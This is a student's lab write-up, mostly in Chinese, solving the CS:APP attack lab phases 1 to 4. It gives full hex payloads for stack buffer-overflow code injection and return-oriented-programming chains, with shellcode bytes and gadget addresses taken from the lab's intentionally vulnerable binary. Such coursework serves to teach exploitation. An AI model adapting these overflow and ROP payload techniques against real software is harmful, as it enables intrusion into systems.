# attack-lab

## lab recitation

><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210527205450.png" alt="image-20210527205449976" style="zoom:80%;" />
>
>——————
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528132059.png" alt="image-20210528132052288" style="zoom:80%;" />
>
>——————
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528132644.png" alt="image-20210528132643905" style="zoom:80%;" />
>
>——————
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528135347.png" alt="image-20210528135347213" style="zoom:80%;" />
>
>——————
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528140222.png" alt="image-20210528140222420" style="zoom:80%;" />
>
>how to generate bytes sequence for assembly instruction sequences?
>
>use `GCC ` and `objdump`
>
>自己先创建xxx.s，汇编文件，然后写一些汇编指令（这就是想要注入的攻击代码），然后
>1 gcc -c foo.s，编译成目标代码 foo.o
>2 objdump -d foo.o ，就能查看和汇编代码相应的机器代码



## lab-notes

### phase_1

>
>
>缓冲区溢出攻击
>输入过量字符串，覆盖callq func 时候保存的$rip，使得getbuf()执行完req之后，返回到touch1()函数的位置
>
>分析
>下面这个截图是test() 执行call func<getbuf>，将返回地址入栈后的情况。
>此时stack pointer保存的是返回时候的rip，目的也就是通过缓冲区覆盖，将这四个字节覆盖成 0xc0 0x17 0x40
>
>```asm
>00000000004017c0 <touch1>:
>  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
>```
>
>
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528144543.png" alt="image-20210528144543526" style="zoom:80%;" />
>
>也就是说，只需要通过hex2raw输入这样的byte sequences即可
>
>```
>31 31 31 31 31 31 31 31 31 31 
>31 31 31 31 31 31 31 31 31 31 
>31 31 31 31 31 31 31 31 31 31 
>31 31 31 31 31 31 31 31 31 31 (40个任意的字符)
>c0 17 40
>```
>
>



### phase_2

>
>
>ret的时候，先执行：把cookie赋值给$rdi，然后再跳转到touch2()
>
>```
>mov $0x59b997fa,%rdi
>mov $0x4017ec,%rsp
>push %rsp
>ret
>
>前面是一些填充字节
>然后ret到这里
>
>
>回到缓冲区
>4017a8
>
>mov $0x4017ec,%eax
>push %eax
>mov $0x59b997fa,%rdi
>ret
>
>```
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528162244.png" alt="image-20210528162244714" style="zoom:80%;" />
>
>然后 PASS!
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528162317.png" alt="image-20210528162317614" style="zoom:80%;" />
>
>首先修改跳转指令，跳转到buffer，开始执行buffer的指令，
>
>buffer中的指令的逻辑是，修改$rdi为cookie，然后将touch2的地址push入栈，然后ret即可（此时的rsp仍然在getbuf函数栈上，push touch2地址之后，rsp刚好处于call get_buf的位置和buffer结尾中间。
>
>相应的指令生成
>
>```asm
>0000000000000000 <.text>:
>   2:	48 c7 c0 ec 17 40 00 	mov    $0x4017ec,%rax
>   9:	50                   	push   %rax
>   a:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
>  11:	c3                   	retq   
>```
>
>最后需要注意的部分
>
>```bash
>48 c7 c0 ec 17 40 00 50 48 c7 
>c7 fa 97 b9 59 c3 31 31 31 31 
>31 31 31 31 31 31 31 31 31 31 
>31 31 31 31 31 31 31 31 31 31 
>78 dc 61 55 # 这4个字节是直接要Ret的，也就是getbuf执行完之后，直接跳转到缓冲区的起始位置
>
>```
>
>另外有一点，rip执行代码的时候，rip逐渐增加，因此攻击代码正序输入buffer中即可。



### phase_3

>
>
>需要转化的字符串
>
>```
>35 39 62 39 39 37 66 61 00
>```
>
>由于会存在stack的覆盖，因此尝试的思路是，把cookie字符串尽量放到buffer的低地址，尽量避免覆盖
>
>```asm
>0000000000000000 <.text>:
>0:	48 c7 c0 fa 18 40 00 	mov    $0x4018fa,%rax
>7:	50                   	push   %rax
>8:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi
>f:	c3                   	retq   
>```
>
>对应的十六机制为
>
>```bash
>35 39 62 39 39 37 66 61 00 31 # cookie字符串
>48 c7 c0 fa 18 40 00 50 48 c7 # 可执行代码，push touch3的地址
>c7 78 dc 61 55 c3 31 31 31 31 # 然后将cookie字符串的地址存储到touch3的第一个参数$rdi中
>31 31 31 31 31 31 31 31 31 31 
>82 dc 61 55	
>```
>
>
>
>尝试结果，不行，即使是低地址，也还是会被`hexmatch`的saved register覆盖。
>
>
>
>思路，回顾getbuf()函数如何被调用的？
>test()函数中，call <getbuf>，这个过程中，test()函数内部申请了部分stack空间，然后call的时候会再次rsp-8，也就是申请8字节空间用于存放return address。
>缓冲区溢出攻击，也就是通过写过量的字符串，覆盖掉return address，从而完成攻击的。
>
>getbuf() frame中，申请了40字节的空间用于输入缓冲区的存放。可执行bytes在40字节缓冲区中，return address用于跳转rip，也就是用可执行bytes的首地址覆盖掉return address。把可执行bytes执行完毕之后，刚好rsp指向cookie string，这个时候再调用函数，也只是push新的栈空间，刚好不会覆盖前面位置的cookie string
>
>（简单总结，在当前函数frame中，缓冲区覆盖掉return address，并且**覆盖了上个函数frame的部分内容**，并不会触发segment fault）
>
>```bash
>0~8  	xxxxxxxxxx	# 可执行bytes
>8~16	xxxxxxxxxx	# 可执行bytes
>16~24	xxxxxxxxxx	# 可执行bytes
>24~32
>32~40 	xxxxxxxxxx  # 到这里，缓冲区刚好结束
>40~48  "return address" # 修改return address
>48~54 "cookie string" #溢出
>```
>
>
>
>这样就可以PASS了
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528205021.png" alt="image-20210528205014372" style="zoom:80%;" />
>



### phase_4

>
>
>新增限制，栈随机化+栈不可执行
>
>要求同样通过溢出缓冲区，加上ROP，来触碰到touch2()函数
>
>ROP，return-oriented program
>**栈是不可执行的，但是code是可以执行的**，跳转到code部分，并且通过观察，达到执行意想不到的代码的目的（汇编代码被截断）
>
>
>
>这样一来思路就比较清晰了
>根据writeup 中提到的，只需要两次ROP即可完成任务
>
>分析一下任务是啥
>1 最终要跳转到touch2，触发函数之后，函数要执行成功
>2 执行成功，就是要将cookie赋值给$rdi
>
>结合figure 3A, figure 3B，以及farm中符合`48 89 xx`的，符合`5x`的
>一共有个三四个可以ROP的汇编指令
>
>```asm
>00000000004019a0 <addval_273>:
>  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
>  4019a6:	c3                   	retq 
>  # 使用 48 89 c7 c3
>  # 对应汇编是 mov %rax, %rdi
>  #   	      ret
> 0000000000401a03 <addval_190>:
>  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
>  401a09:	c3                   	retq  
>  # 可以使用 48 89 e0 c3
>  # 对应汇编 mov %rsp, %rax
>  #		    ret
>  00000000004019a7 <addval_219>:
>  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
>  4019ad:	c3                   	retq 
>  # 可以使用 58 90 c3 (90对应nop，冒泡指令)
>  # 对应汇编 popq %rax
>  00000000004019ca <getval_280>:
>  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
>  4019cf:	c3                   	retq   
>  # 同上，58 90 c3 c3
>  # 同上对应汇编 popq %rax
>```
>
>
>
>也就是说ROP可以使用的汇编是
>
>```asm
>popq %rax
>mov %rax, %rdi
>```
>
>很容易想到，首先ret到`popq %rax`这里，然后将cookie pop给$rax，然后继续ret到`mov %rax,%rdi`这里，然后继续ret，ret到`touch2`函数这里即可完成
>
>```
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>cc 19 40 00 00 00 00 00 
>fa 97 b9 59 00 00 00 00
>a2 19 40 00 00 00 00 00
>ec 17 40 00 00 00 00 00 
>或者
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>31 31 31 31 31 31 31 31
>ab 19 40 00 00 00 00 00  #这里不一样
>fa 97 b9 59 00 00 00 00
>a2 19 40 00 00 00 00 00
>ec 17 40 00 00 00 00 00 
>```
>
>
>
>
>
>
>
>so easy
>
><img src="https://yszhou.oss-cn-beijing.aliyuncs.com/img/20210528220041.png" alt="image-20210528220041126" style="zoom:80%;" />



### phase_5

>
>
>有空再补上，
>
>可以参考
>
>https://zhuanlan.zhihu.com/p/28476993